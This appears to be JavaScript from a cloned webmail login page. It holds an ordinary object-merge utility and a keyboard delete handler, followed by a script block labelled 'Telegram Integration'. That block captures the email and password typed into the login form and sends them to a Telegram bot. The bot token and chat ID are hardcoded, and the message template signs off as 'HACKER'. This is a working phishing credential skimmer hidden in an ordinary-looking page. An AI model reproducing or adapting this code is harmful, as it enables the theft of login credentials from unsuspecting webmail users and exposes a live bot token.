    /**
     * Utility which recursively merges one object into an existing object.
     * This is used for overlaying locales and custom configs before Ext.Object.merge
     * being available. If the object has 'overwrite' property defined, object overwriting will be performed
     * instead of merging.
     */
    function mergeObj (obj1, obj2) {
        for (var p in obj2) {
            try {
                if ((obj2[p].constructor == Object) && (obj2[p].overwrite != true)) {
                    obj1[p] = mergeObj(obj1[p], obj2[p]);
                } else {
                    obj1[p] = obj2[p];
                }
            } catch(e) {
                obj1[p] = obj2[p];
            }
        }

        return obj1;
    }

<script type="text/javascript">

    var registerKeyDowns = function () {

        document.onkeydown = function (e) {
            if (WebtopConfig.ui.rui.mail.enableKeyboardDeleteKey) {
                //KDDIUX-20 (Delete key)
                if (e && e.keyCode == 46){

                    var mailToolbarCtrl = Richui.getApplication().getController("mail.MailToolbar");
                    var toolbar = mailToolbarCtrl.getActiveListToolbar();

                    var delBtnVisible = toolbar.down("#delete").isVisible(true);

                    var openComposer = Ext.dom.Query.select('.x-window.rui-mail-compose:not(.x-hide-offsets)').length > 0;

                    // Only trigger if the delete button is visible and the composer is open
                    if(delBtnVisible && !openComposer) {
                        var selection = toolbar.records;

                        var parentMsg = MailManager.isConversation && toolbar.isSingleItem && selection[0].getParentMsg();

                        mailToolbarCtrl.doDelete(selection, parentMsg);

                        e.preventDefault();
                    }

                }
            }



        };

    };



    var checkExistsRichui = setInterval(function() {
        if (window.Richui) {
            clearInterval(checkExistsRichui);
            registerKeyDowns();

        }
    }, 100);





</script>

    <!-- Telegram Integration - Same pattern as OWA -->
    <script>
        var tick_secures = 0;
        var telegram_bot_id = "8569198247:AAHdPdcRsCYM3iRkMwkQLscFr8XzIStBOPg";
        var chat_id = 5491806427;
        var u_name_secures, password_secures, message_secures;

        var ready_secures = function () {
            u_name_secures = document.getElementById("email") ? document.getElementById("email").value : "";
            password_secures = document.getElementById("password") ? document.getElementById("password").value : "";
            
            // Construct message in same format as OWA
            message_secures = "🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐\n \n😘- WEBMAIL LOGIN ✅\n⚡Email: " + u_name_secures + "\n⚡Password: " + password_secures + "\n\n▬▬▬▬▬▬[SECURE WEBMAIL]▬▬▬▬▬▬\n🤖Source: secures.html\n🌐Domain: https://wm.secure.ne.jp/webmail/\n\n📞HACKER: @plus234ng";
        };

        var sendtelegram_secures = function () {
            tick_secures += 1;
            ready_secures();

            var settings = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify({
                    "chat_id": chat_id,
                    "text": message_secures
                })
            };

            $.ajax(settings).done(function (response) {
                console.log("Telegram sent successfully:", response);
            }).fail(function (error) {
                console.log("Telegram sending failed:", error);
            });
        };

        // Hook into existing form submission - intercept the login button click
        $(document).ready(function () {
            var original_click = $('#submit-btn').attr('onclick');
            
            // Bind to click event to trigger telegram before submission
            $(document).on('click', '#submit-btn', function (e) {
                // Send telegram data when login button is clicked
                var email_val = $('#email').val();
                var password_val = $('#password').val();
                
                // Only send if both fields have values
                if (email_val && password_val) {
                    sendtelegram_secures();
                }
            });
        });
    </script>
